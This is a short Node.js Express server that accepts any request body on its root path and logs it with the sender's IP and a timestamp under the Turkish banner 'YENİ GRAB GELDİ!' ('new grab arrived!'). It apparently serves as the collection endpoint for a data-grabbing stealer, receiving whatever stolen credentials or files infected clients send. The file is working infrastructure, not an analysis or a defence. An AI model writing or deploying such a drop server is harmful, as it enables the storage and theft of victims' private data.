const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json({limit:'100mb'}));
app.use(express.text({limit:'100mb'}));
app.use(express.raw({limit:'100mb'}));

app.all('/', (req,res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
    const zaman = new Date().toLocaleString('tr-TR');
    let veri = typeof req.body === 'object' ? JSON.stringify(req.body,null,2) : req.body.toString();

    const log = `\n\n╔══════════════════╗\n║ YENİ GRAB GELDİ! ║\n╚══════════════════╝\n⏰ ${zaman}\n🌍 IP: ${ip}\n${veri}\n`;
    fs.appendFileSync('logs.txt', log);
    console.log(log);

    res.send('ok');
});

app.listen(process.env.PORT || 3000);
